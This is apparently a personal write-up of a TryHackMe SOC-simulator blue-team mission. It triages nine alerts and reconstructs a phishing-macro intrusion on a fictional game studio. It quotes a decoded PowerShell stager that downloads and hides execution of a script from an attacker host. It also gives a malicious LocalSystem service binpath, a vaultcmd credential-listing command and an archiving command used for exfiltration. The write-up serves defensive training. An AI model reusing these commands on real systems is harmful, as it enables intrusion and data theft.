# Repossessed (TryHackMe, Downtime SOC Simulator)

- **Event/module:** Strange & Unusual Activity ("Downtime" / ShowDowntime) blue-team CTF, 22 to 26 Oct 2026.
  Mission 01 of 8. **SOC Simulator** scenario (alert triage). Jr Pen Tester adjacent, defensive track.
- **Date:** 2026-10-23.
- **Status:** SOLVED. Triaged all **9 alerts** (IDs 6352 to 6360): **8 True Positive, 1 False Positive**.
  Full kill chain reconstructed; all 4 scenario objectives answered. +740 XP, +500 team points, 1 raffle ticket.
- **SIEM chosen:** Splunk. Telemetry = Sysmon (Microsoft-Windows-Sysmon/Operational) + Security log (4697).
- **Victim org:** TryHatMe Studios (`tryhatmestudios.thm`), domain `TRYHATME`, protecting the unreleased game
  build **NeuralNexus**. Domain SID `S-1-5-21-1966530601-3185510712-10604624` (same family seen in
  [[proxy]] / [[forward]]).

## Scenario objectives and answers

| Objective | Answer |
|---|---|
| What caused the unusual activity | *(find it yourself)* |
| Was the host talking to an external party | *(find it yourself)* |
| How did it reach additional systems | *(find it yourself)* |
| Was data accessed or removed | *(find it yourself)* |

## Alert verdicts (9 total)

| ID | Rule | Tactic | Verdict |
|---|---|---|---|
| 6352 | Suspicious Child Process Spawned (`ai.exe`) | Execution | **False Positive** (Office Local AI Host, signed, benign) |
| 6353 | Suspicious Child Process Spawned (`powershell -Enc`) | Execution | True Positive |
| 6354 | Suspicious Outbound Connection Following Document Execution | Command and Control | True Positive |
| 6355 | Anomalous Credential Vault Access | Credential Access | True Positive |
| 6356 | Rapid Domain and Host Enumeration | Discovery | True Positive |
| 6357 | Suspicious Remote Logon and Service Creation | Lateral Movement | True Positive |
| 6358 | External Connection Following Archive Creation (`<ip>:443`) | Exfiltration | True Positive |
| 6359 | Suspicious Archive Utility Execution (`7z` -> `nx_build_beta.7z`) | Collection | True Positive |
| 6360 | External Connection Following Archive Creation (`<ip>:8067`) | Exfiltration | True Positive |

**The one FP (6352):** `ai.exe` (`...\Office16\AI\ai.exe`, loads `WordCombinedFloatieLreOnline.onnx`) is Word's
signed Local AI Host. It shares the same malicious parent (WINWORD PID 6184) as the real payload in 6353, so
the trap is to close both the same way. Shared parent does not equal shared verdict: judge the child.

## Reconstructed kill chain

1. **Initial access (T1566.001):** `m.smith` on `THM-MSMITH` (`<ip>`) opens
   `Q3_PressKit_Feedback.docm` in WINWORD (PID 6184).
2. **Execution (T1059.001):** macro spawns `powershell.exe -NoP -W Hidden -Enc ...` (PID 8572). Decoded:
   ```powershell
   $stager = "$env:TEMP\svchost_update.ps1"
   (New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager)
   Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`"" -WindowStyle Hidden
   ```
3. **C2 / stager pull (T1105/T1071):** PID 8572 connects to `<ip>:8067` (`paylink-cdn.thm`), drops
   `%TEMP%\svchost_update.ps1`, relaunches it (PID 9356).
4. **Credential access (T1555):** stage 2 runs `vaultcmd.exe /listcreds:"Windows Credentials"` (PID 10872).
5. **Discovery (T1087/T1018):** stage 2 runs a burst of `net.exe user /domain` style enumeration (PID 9744).
6. **Lateral movement (T1021.002 + T1543.003 + T1569.002):** `svc-mktshare` installs service `SvcUpdate` on
   `THM-SREYES` (`<ip>`), binpath
   `cmd.exe /c start /b powershell.exe ... -File C:\Windows\Temp\svchost_update.ps1`, runs as LocalSystem
   (Security event 4697).
7. **Collection (T1560.001 + T1074):** SYSTEM payload (PID 14264) runs
   `7z.exe a -mx=1 C:\Windows\Temp\nx_build_beta.7z C:\Dev\NeuralNexus\Build\*`.
8. **Exfiltration (T1567 then T1041):** SYSTEM PowerShell pushes the archive out, first to Cloudflare-fronted
   `<ip>:443` (PID 12408), then to the C2 `<ip>:8067` (PID 14264).

## IOCs

- **Files:** `Q3_PressKit_Feedback.docm` (lure), `svchost_update.ps1` (stager; `%TEMP%` and `C:\Windows\Temp`),
  `nx_build_beta.7z` (staged build archive).
- **Network:** `paylink-cdn.thm` -> `<ip>:8067` (C2/exfil); `<ip>:443` (Cloudflare-fronted
  exfil channel).
- **Service:** `SvcUpdate` (LocalSystem), the `cmd /c start /b powershell ... svchost_update.ps1` binpath.
- **Accounts:** `TRYHATME\m.smith` (patient zero), `TRYHATME\svc-mktshare` (lateral, SID `...-1126`).
- **Hosts:** `THM-MSMITH` (`<ip>`), `THM-SREYES` (`<ip>`, Sophia Reyes).

## Lessons learned

- **Triage along the ATT&CK chain, not alert by alert.** The dashboard categories (Execution, C2, Credential
  Access, Discovery, Lateral Movement, Collection, Exfiltration) were literally the storyline order. Each TP
  advanced one objective; the FP did not touch the chain.
- **Shared parent, different verdict.** 6352 (`ai.exe`) and 6353 (`powershell -Enc`) both child off WINWORD
  PID 6184. The signed Office helper is still benign. Verdict follows the child's behaviour, not the parent.
- **Exfil destination can differ from C2.** 6358 went to a Cloudflare IP (`<ip>`), not the C2. The
  "is the destination approved?" prompt is the trap; a SYSTEM payload archiving source then uploading over
  443 is exfil regardless of the IP's reputation.
- **`VaultCmd /listcreds` is a cheap credential-access tell** (no LSASS touch, Medium integrity). Parentage
  separates benign support use from theft: here the parent was the malware, not an admin session.
- **Report structure that scored:** TP template = Time of activity / Affected entities / Reason for TP /
  Reason for escalating / Remediation / Attack indicators, escalation = Yes. FP template is shorter (Time /
  Related entities / Reason for FP), no escalation. Submit is per alert, not batched.

## Related

- [[quiet-as-the-grave]] - Downtime mission 02, the threat hunt that revisits this same intrusion from
  Sophia Reyes's (`THM-SREYES`) side a week later.
- [[proxy]] / [[forward]] - same domain SID family; constrained delegation / RBCD rooms.
- [[tryhackme-learning-buddy]] - study-buddy context.
